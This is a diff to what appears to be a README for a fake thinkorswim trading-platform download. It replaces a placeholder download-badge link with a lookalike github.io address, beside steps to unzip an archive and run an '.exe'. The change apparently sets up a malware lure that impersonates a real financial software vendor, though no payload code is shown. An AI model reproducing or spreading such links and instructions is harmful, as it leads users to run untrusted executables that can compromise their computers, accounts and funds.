@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://thinkorswim-tdameritrade-download.github.io/.github/)
 
 ## 📸 Overview
 ![thinkorswim-advanced-charting](https://github.com/user-attachments/assets/dd7277a0-da15-4cb6-8e94-032133b41655)
